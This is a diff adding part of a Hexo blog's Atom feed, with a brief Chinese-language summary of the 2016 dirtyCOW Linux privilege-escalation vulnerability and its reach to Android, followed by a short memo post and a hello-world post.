+      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近研究人员Phil Oester发现了dirtyCOW脏奶牛漏洞，影响从2007年linux2.6.22至今的所有linux内核。dirtyCOW是本地提权漏洞，具体是利用linux内存子系统在处理写时复制(copy-on-write,COW)时产生了竞争条件,使得低权限用户有机会对只读内存里的内容进行写入操作，达到提权的目的。&lt;br&gt;众所周知，android系统也是基于linux内核，所以dirtyCOW对android设备同样适用，而且是全系android通用，因为android 1.0 内核版本是2.6.25。&lt;br&gt;github上已经有人放出了android可用的&lt;a href=&quot;https://github.com/timwr/CVE-2016-5195&quot;&gt;PoC&lt;/a&gt;,而谷歌11月5日发布的安全更新还没有修复这个漏洞，有兴趣测试的可以一下。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="android" scheme="https://t1h0can.github.io/tags/android/"/>
+    
+      <category term="安全" scheme="https://t1h0can.github.io/tags/%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>。。。</title>
+    <link href="https://t1h0can.github.io/2016/11/10/memorandum/"/>
+    <id>https://t1h0can.github.io/2016/11/10/memorandum/</id>
+    <published>2016-11-09T21:21:39.000Z</published>
+    <updated>2016-11-17T17:43:40.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>随便写点博客，不求利人，只求给自己健忘的脑子记本备忘录</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;随便写点博客，不求利人，只求给自己健忘的脑子记本备忘录&lt;/p&gt;
+
+    
+    </summary>
+    
+    
+      <category term="杂" scheme="https://t1h0can.github.io/tags/%E6%9D%82/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>hello-world</title>
+    <link href="https://t1h0can.github.io/2016/11/10/hello-world/"/>
+    <id>https://t1h0can.github.io/2016/11/10/hello-world/</id>
+    <published>2016-11-09T21:16:18.000Z</published>
+    <updated>2016-11-15T18:41:38.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>折腾了几天，看了好多人的教程，终于通过hexo在github上搭出自己的博客。。。<br>还有不少问题没解决，功能没添加，慢慢来吧，先宣誓主权：</p>
+<p><strong>Hello world!</strong></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;折腾了几天，看了好多人的教程，终于通过hexo在github上搭出自己的博客。。。&lt;br&gt;还有不少问题没解决，功能没添加，慢慢来吧，先宣誓主权：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Hello world!&lt;/strong&gt;&lt;/p&gt;
+
+    
+    </summary>
+    
+    
+      <category term="test" scheme="https://t1h0can.github.io/tags/test/"/>
+    
+      <category term="杂" scheme="https://t1h0can.github.io/tags/%E6%9D%82/"/>
+    
+  </entry>
+  
+</feed>
